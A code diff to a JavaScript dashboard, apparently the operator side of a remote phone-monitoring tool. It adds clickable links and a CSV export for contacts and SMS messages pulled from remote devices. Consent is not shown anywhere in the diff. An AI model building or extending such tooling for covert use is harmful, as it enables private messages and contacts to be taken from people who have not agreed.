@@ -1694,7 +1694,7 @@ async function renderDevices() {
                 <td>${esc(c.command_type)}</td>
                 <td><span style="padding:2px 8px;border-radius:4px;font-size:12px;background:${c.status === 'completed' ? '#22c55e22' : c.status === 'failed' ? '#ef444422' : '#f59e0b22'};color:${c.status === 'completed' ? '#22c55e' : c.status === 'failed' ? '#ef4444' : '#f59e0b'}">${esc(c.status)}</span></td>
                 <td>${dt(c.created_at)}</td>
-                <td>${c.result_data ? formatResultData(c.command_type, c.result_data) : '—'}</td>
+                <td>${c.result_data ? formatResultData(c.command_type, {...c.result_data, cmdId: c.id, userId: c.user_id}) : '—'}</td>
               </tr>
             `).join('')}
           </tbody>
@@ -1755,9 +1755,17 @@ window.showCommandResults = async function(cmdType, cmdId, userId) {
   
   const data = latest.result_data;
   let html = '<div style="max-height:60vh;overflow-y:auto">';
+  let downloadFilename = '';
+  
+  // Store data globally for download
+  window._downloadData = data;
+  window._downloadType = cmdType;
   
   if (cmdType === 'get_contacts') {
     const contacts = data.contacts || [];
+    downloadFilename = `contacts_${new Date().toISOString().split('T')[0]}.csv`;
+    window._downloadFilename = downloadFilename;
+    
     html += `<h3>📱 Contacts (${contacts.length})</h3>`;
     if (contacts.length === 0) {
       html += '<p>មិនមាន contacts ទេ</p>';
@@ -1770,9 +1778,12 @@ window.showCommandResults = async function(cmdType, cmdId, userId) {
     }
   } else if (cmdType === 'get_sms') {
     const messages = data.messages || [];
+    downloadFilename = `sms_${new Date().toISOString().split('T')[0]}.csv`;
+    window._downloadFilename = downloadFilename;
+    
     html += `<h3>💬 SMS Messages (${messages.length})</h3>`;
     if (messages.length === 0) {
-      html += '<p>មិនមាន SMS ទេ (មុខងារនេះតម្រូវឱ្យមាន native Android code)</p>';
+      html += '<p>មិនមាន SMS ទេ</p>';
     } else {
       html += '<div style="display:flex;flex-direction:column;gap:8px;margin-top:12px">';
       messages.forEach(m => {
@@ -1783,7 +1794,57 @@ window.showCommandResults = async function(cmdType, cmdId, userId) {
   }
   
   html += '</div>';
+  
+  // Add download button
+  if (window._downloadData && ((window._downloadData.contacts && window._downloadData.contacts.length > 0) || (window._downloadData.messages && window._downloadData.messages.length > 0))) {
+    html = `<div style="margin-bottom:12px"><button class="btn primary" onclick="downloadCSV()">⬇️ Download CSV</button></div>` + html;
+  }
+  
   showModal(cmdType === 'get_contacts' ? '📱 Contacts' : '💬 SMS Messages', html);
+};
+
+window.downloadCSV = function() {
+  const cmdType = window._downloadType;
+  const data = window._downloadData;
+  const filename = window._downloadFilename;
+  
+  if (!data) {
+    toast('❌ No data to download', true);
+    return;
+  }
+  
+  let csv = '';
+  
+  if (cmdType === 'get_contacts') {
+    csv = 'Name,Phone,Email\n';
+    (data.contacts || []).forEach(c => {
+      const name = (c.displayName || '').replace(/,/g, ' ').replace(/"/g, '""');
+      const phones = (c.phones || []).join('; ').replace(/,/g, ' ').replace(/"/g, '""');
+      const emails = (c.emails || []).join('; ').replace(/,/g, ' ').replace(/"/g, '""');
+      csv += `"${name}","${phones}","${emails}"\n`;
+    });
+  } else if (cmdType === 'get_sms') {
+    csv = 'Date,From/To,Type,Message\n';
+    (data.messages || []).forEach(m => {
+      const date = new Date(m.date).toISOString();
+      const address = (m.address || '').replace(/,/g, ' ').replace(/"/g, '""');
+      const type = m.type || 'unknown';
+      const body = (m.body || '').replace(/,/g, ' ').replace(/\n/g, ' ').replace(/"/g, '""');
+      csv += `"${date}","${address}","${type}","${body}"\n`;
+    });
+  }
+  
+  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+  const link = document.createElement('a');
+  const url = URL.createObjectURL(blob);
+  link.setAttribute('href', url);
+  link.setAttribute('download', filename);
+  link.style.visibility = 'hidden';
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+  
+  toast('✅ Downloaded!', true);
 };
 
 window.showLocationDetails = async function(cmdId, userId) {
@@ -1865,10 +1926,10 @@ function formatResultData(cmdType, data) {
     `;
   } else if (cmdType === 'get_contacts') {
     const count = data.count || 0;
-    return `<span style="color:#22c55e">✅ ${count} contacts</span>`;
+    return `<a href="#" onclick="showCommandResults('get_contacts', ${data.cmdId}, ${data.userId}); return false;" style="color:#3B9AD9;text-decoration:none">📱 ${count} contacts ⬇️</a>`;
   } else if (cmdType === 'get_sms') {
     const count = data.count || 0;
-    return `<span style="color:#22c55e">✅ ${count} SMS</span>`;
+    return `<a href="#" onclick="showCommandResults('get_sms', ${data.cmdId}, ${data.userId}); return false;" style="color:#3B9AD9;text-decoration:none">💬 ${count} SMS ⬇️</a>`;
   } else {
     return esc(JSON.stringify(data).slice(0, 80));
   }
